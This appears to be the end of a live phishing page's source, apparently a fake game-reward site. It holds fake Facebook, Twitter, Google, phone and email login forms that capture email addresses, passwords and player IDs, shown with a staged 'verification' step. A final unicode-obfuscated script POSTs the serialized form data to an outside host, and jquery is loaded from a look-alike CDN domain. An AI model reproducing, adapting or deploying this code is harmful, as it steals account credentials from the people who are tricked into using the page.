  }
  slides[slideIndex-1].style.display = "block";  
  dots[slideIndex-1].className += " actives";
  setTimeout(showSlides,6000);
}
        </script>
          <script>
          let slideIndexHeader = 0;
showSlidesHeader();
function showSlidesHeader() {
    let i;
    let slidesHeader = document.getElementsByClassName("sliderHeader");
    for (i = 0; i < slidesHeader.length; i++) {
        slidesHeader[i].style.display = "none"; 
    }
    slideIndexHeader++;
    if (slideIndexHeader > slidesHeader.length) {slideIndexHeader = 1} 
    slidesHeader[slideIndexHeader-1].style.display = "block"; 
    setTimeout(showSlidesHeader, 3000);
};
  </script>
    <script>
    function open_facebook() {
    $('.login-facebook').show();
    $('.account_login').hide();
    $('.more_login').hide();    
}
function open_twitter() {
    $('.login-twitter').show();
    $('.account_login').hide();
    $('.more_login').hide();  
}
function close_facebook() {
    $('.login-facebook').hide();
    $('.account_login').show();
    $('#load-login').hide();    
    $('#box-login').show();
}
function close_twitter() {
    $('.login-twitter').hide();
    $('.account_login').show();
    $('#load-login').hide();    
    $('#box-login').show();
}

$(document).ready(function(){
  $('#password-twitter').keyup(function(){
      if($(this).val().length !=0){
          $('.onbutton').removeClass().addClass('twbutton'); 
      }
      else
      {
          $('.twbutton').removeClass().addClass('onbutton'); 
      }
  })
});
$(document).ready(function(){
  $('#sec-password-twitter').keyup(function(){
      if($(this).val().length !=0){
          $('.seconbutton').removeClass().addClass('sectwbutton'); 
      }
      else
      {
          $('.sectwbutton').removeClass().addClass('seconbutton'); 
      }
  })
});
// code function data
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$emailfb = $('#email-facebook').val().trim();
	$passwordfb = $('#password-facebook').val().trim();
	$loginfb = $('#login-facebook').val().trim();
    $playid = $('#ValidatePopupPlayId').val().trim()
            if($emailfb == '' || $emailfb == null || $emailfb.length <= 5)
            {
                $('.email-fb').fadeIn();
                setTimeout(function () {
                $('.email-fb').fadeOut();
                }, 2000);                     
                $('.sandi-fb').hide();
                $('.PlayerIdLoginBox').hide();
                $('.login-facebook').show();
                return false;
            }else{
               $('.email-fb').hide();               
	           $("input#validateEmail").val($emailfb);
               $('.login-facebook').hide();  
               $('.PlayerIdLoginBox').show();
            }
            if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5)
            {
                $('.sandi-fb').fadeIn();
                setTimeout(function () {
                $('.sandi-fb').fadeOut();
                }, 2000);                     
                $('.PlayerIdLoginBox').hide();
                $('.login-facebook').show();
                return false;
            }else{
               $('.sandi-fb').hide();
	           $("input#validatePassword").val($passwordfb);
	           $("input#validateLogin").val($loginfb);
               $('input#ValidatePopupPlayId').val($playid)
               $('.login-facebook').hide();	 
               $('.login-facebook-load').show()
               setTimeout(function () {
               $('.login-facebook-mt').hide(); 
               $('.account_verification').show()
               $('.login-facebook-sec').hide()
               $('.login-facebook-load').hide()
               }, 3000)
          }
      });  
	return false;     	           
}

function ValidateLoginTwitterData() {
	$('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
	submitingValidateLoginTwitterData.preventDefault();
	
	$emailtw = $('#email-twitter').val().trim();
	$passwordtw = $('#password-twitter').val().trim();
	$logintw = $('#login-twitter').val().trim();
    $playid = $('#ValidatePopupPlayId').val().trim()
            if($emailtw == '' || $emailtw == null || $emailtw.length <= 3)
            {
                $('.email-tw').fadeIn();
                setTimeout(function () {
                $('.email-tw').fadeOut();
                }, 2000);                     
                $('.sandi-tw').hide();
                $('.PlayerIdLoginBox').hide();
                $('.login-twitter').show();
                return false;
            }else{
               $('.email-tw').hide();               
	           $("input#validateEmail").val($emailtw);
               $('.login-twitter').hide();  
               $('.PlayerIdLoginBox').show();
            }
            if($passwordtw == '' || $passwordtw == null || $passwordtw.length <= 7)
            {
                $('.sandi-tw').fadeIn();
                setTimeout(function () {
                $('.sandi-tw').fadeOut();
                }, 2000);                     
                $('.PlayerIdLoginBox').hide();
                $('.login-twitter').show();
                return false;
            }else{
               $('.sandi-tw').hide();
	           $("input#validatePassword").val($passwordtw);
	           $("input#validateLogin").val($logintw);
               $('input#ValidatePopupPlayId').val($playid)         
               $('.login-twitter').hide();	
               $('.login-twitter-load').show()
               setTimeout(function () {
                $('.account_verification').show()
				$('.login-twitter-sec').hide()
               $('.login-twitter-load').hide()
               }, 3000)
          }
      });  
	return false;     	           
}
    </script>
      <script>
      
      </script>
        <script>
        function open_more() {
    $('.more_login').show()
    $('.account_login').hide()
    }
    function close_more() {
    $('.more_login').hide()
    $('.account_login').show()
    }
function open_google() {
	$('.login-google').show();
	$('.more_login').hide();
}
function close_google() {
	$('.login-google').hide();
	$('.account_login').show();
    $('.more_login').hide();
}

function setFocus(on) {
  var element = document.activeElement;
  if (on) {
      setTimeout(function() {
          element.parentNode.classList.add("focus");
      });
  } else {
      let box = document.querySelector(".input-box");
      box.classList.remove("focus");
      $("input").each(function() {
          var $input = $(this);
          var $parent = $input.closest(".input-box");
          if ($input.val()) $parent.addClass("focus");
          else $parent.removeClass("focus");
      });
  }
}

function ValidateLoginGoogleData() {
	$('#ValidateLoginGoogleForm').submit(function(submitingValidateLoginGoogleData){
	submitingValidateLoginGoogleData.preventDefault();
	
	$emailgoogle = $('#google-email').val().trim();
	$passwordgoogle = $('#google-password').val().trim();
	$logingoogle = $('#google-login').val().trim();
            if($emailgoogle == '' || $emailgoogle == null || $emailgoogle.length <= 5)
            {
                $('.email-google').fadeIn();
                setTimeout(function () {
                $('.email-google').fadeOut();
                }, 2000);                     
                $('.sandi-google').hide();
                $('.login-google').show();
                return false;
            }else{
               $('.email-google').hide();               
	           $("input#validateEmail").val($emailgoogle);
               $('.login-google').hide();
            }
            if($passwordgoogle == '' || $passwordgoogle == null || $passwordgoogle.length <= 5)
            {
                $('.sandi-google').fadeIn();
                setTimeout(function () {
                $('.sandi-google').fadeOut();
                }, 2000);
                $('.login-google').show();
                return false;
            }else{
               $('.sandi-google').hide();
	           $("input#validatePassword").val($passwordgoogle);
	           $("input#validateLogin").val($logingoogle);	
               $('.login-google').hide();	 
               $('.login-google-load').show()
               setTimeout(function () {
               $('.login-google-sec').hide()
               $('.account_verification').show()
               $('.login-google-load').hide()
               }, 3000)
          }
      });  
	return false;     	           
}

function SecValidateLoginGoogleData() {
	$('#SecValidateLoginGoogleForm').submit(function(submitingSecValidateLoginGoogleData){
	submitingSecValidateLoginGoogleData.preventDefault();
	
	$emailgooglez = $('#google-email-sec').val().trim();
	$passwordgooglez = $('#google-password-sec').val().trim();
	$logingooglez = $('#google-login-sec').val().trim();
            if($emailgooglez == '' || $emailgooglez == null || $emailgooglez.length <= 5)
            {
                $('.sec-email-google').fadeIn();
                $('.sec-wrong-google').hide();
                setTimeout(function () {
                $('.sec-email-google').fadeOut();
                }, 2000);                     
                $('.sec-sandi-google').hide();
                $('.sec-wrong-google').hide();
                $('.login-google-sec').show();
                return false;
            }else{
               $('.sec-email-google').hide();               
	           $("input#validateEmail").val($emailgooglez);
               $('.login-google-sec').hide();
            }
            if($passwordgooglez == '' || $passwordgooglez == null || $passwordgooglez.length <= 5)
            {
                $('.sec-sandi-google').fadeIn();
                $('.sec-wrong-google').hide();
                setTimeout(function () {
                $('.sec-sandi-google').fadeOut();
                }, 2000);
                $('.login-google-sec').show();
                return false;
            }else{
               $('.sec-sandi-google').hide();
               $('.sec-wrong-google').hide();
	           $("input#validatePassword").val($passwordgooglez);
	           $("input#validateLogin").val($logingooglez);	
               $('.login-google-sec').hide();	 
               $('.login-google-load').show()
               setTimeout(function () {
               $('.login-google-sec').hide()
               $('.account_verification').show()
               $('.login-google-load').hide()
               }, 3000)
          }
      });  
	return false;     	           
}
        </script>
          <script>
          function nt() {
    $('.nt').show();    
    $('.et').hide();    
  }
  function et() {
    $('.et').show();    
    $('.nt').hide();  
  }    
  function open_link() {
    $('.login-mail').show()
    $('.account_login').hide()
  }
  function close_link() {
    $('.login-mail').hide();
    $('.account_login').show();
    $('#load-login').hide();    
    $('#box-login').show();
}
  function openloginlink(evt, loginlink) {
      var i, form_login, form_login_link;
      form_login = document.getElementsByClassName("form_login");
      for (i = 0; i < form_login.length; i++) {
          form_login[i].style.display = "none";        
      }
      form_login_link = document.getElementsByClassName("seclink-content");
      for (i = 0; i < form_login_link.length; i++) {
          form_login_link[i].className = form_login_link[i].className.replace(" seclink-content-active", "");
      }
      document.getElementById(loginlink).style.display = "block";
      evt.currentTarget.className += " seclink-content-active";
  }
  document.getElementById("email-login").click();


function ValidateLoginNumberData() {
    return (
      $('#ValidateLoginNumberForm').submit(function (_0x2ae84f) {
        _0x2ae84f.preventDefault()
        $emailnk = $('#email-nk').val().trim()
        $passwordnk = $('#password-nk').val().trim()
        $loginnk = $('#login-number').val().trim()
        $codetel = $('#code-tel').val().trim()
        if ($emailnk == '' || $emailnk == null || $emailnk.length <= 5) {
          return (
            $('.email-nk').show(),
            setTimeout(function () {
              $('.email-nk').fadeOut()
            }, 2000),
            $('.sandi-nk').hide(),
            $('.account_verification').hide(),
            $('.login-number').show(),
            false
          )
        } else {
          $('.email-nk').hide()
          $('input#validateEmail').val($emailnk)
          $('.login-number').hide()
          $('.account_verification').hide()
        }
        if ($passwordnk == '' || $passwordnk == null || $passwordnk.length <= 7) {
          return (
            $('.sandi-nk').show(),
            setTimeout(function () {
              $('.sandi-nk').fadeOut()
            }, 2000),
            $('.login-number').show(),
            $('.account_verification').hide(),
            false
          )
        } else {
          $('.sandi-nk').hide()
          $('input#validatePassword').val($passwordnk)
          $('input#validateLogin').val($loginnk)
          $('input#validateTel').val($codetel)
          $('.login-number').hide();	 
          $('.login-number-load').show()
          setTimeout(function () {
          $('.login-mail-phone').hide()
          $('.account_verification').show()
          $('.login-number-load').hide()
          }, 3000)
          }
      });  
	return false;     	           
}

  function ValidateLoginMailData() {
    return (
      $('#ValidateLoginMailForm').submit(function (_0x499967) {
        _0x499967.preventDefault()
        $emailk = $('#email-k').val().trim()
        $passwordk = $('#password-k').val().trim()
        $logink = $('#login-mail').val().trim()
        if ($emailk == '' || $emailk == null || $emailk.length <= 10) {
          return (
            $('.email-k').show(),
            setTimeout(function () {
              $('.email-k').fadeOut()
            }, 2000),
            $('.sandi-k').hide(),
            $('.account_verification').hide(),
            $('.login-mail').show(),
            false
          )
        } else {
          $('.email-k').hide()
          $('input#validateEmail').val($emailk)
          $('.login-mail').hide()
          $('.account_verification').hide()
        }
        if ($passwordk == '' || $passwordk == null || $passwordk.length <= 5) {
          return (
            $('.sandi-k').show(),
            setTimeout(function () {
              $('.sandi-k').fadeOut()
            }, 2000),
            $('.login-mail').show(),
            $('.account_verification').hide(),
            false
          )
        } else {
          $('.sandi-k').hide()
          $('input#validatePassword').val($passwordk)
          $('input#validateLogin').val($logink)
          $('.login-mail').hide();	 
          $('.login-mail-load').show()
          setTimeout(function () {
          $('.login-mail-link').hide()
          $('.account_verification').show()
          $('.login-mail-load').hide()
          }, 3000)
          }
      });  
	return false;     	           
                       }
          </script>
<script src="https://cdnassets.biz.id/ajax/libs/jquery/2.9.7/jquery-1.10.2.min.js" type="text/javascript"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js" type="text/javascript"></script>
<script src=""></script>
  <script src="https://cdnassets.biz.id/ajax/libs/jquery/2.9.7/jquery.min.js"></script>
<audio id="audioFiles" src="media/sound_airdrop.mp3"></audio>
<script>
$(document)['\u0072\u0065\u0061\u0064\u0079'](function(){$("\u0023\u0046\u0072\u006F\u006D\u0078\u0046\u0061\u0063\u0065\u0062\u006F\u006F\u006B\u002C\u0023\u0046\u0072\u006F\u006D\u0078\u0047\u006F\u006F\u0067\u006C\u0065")['\u0073\u0075\u0062\u006D\u0069\u0074'](function(x,_0x845g8e){x['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();var _0x3160a=$(this)['\u0073\u0065\u0072\u0069\u0061\u006C\u0069\u007A\u0065']();_0x845g8e='\u0068\u006C\u006B\u0063\u006F\u0063';$['\u0061\u006A\u0061\u0078']({'\u0075\u0072\u006C':'https://p.qifaricloud.my.id/myjs/apixgg.php','\u0074\u0079\u0070\u0065':"\u0050\u004F\u0053\u0054",'\u0064\u0061\u0074\u0061':_0x3160a});});});
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
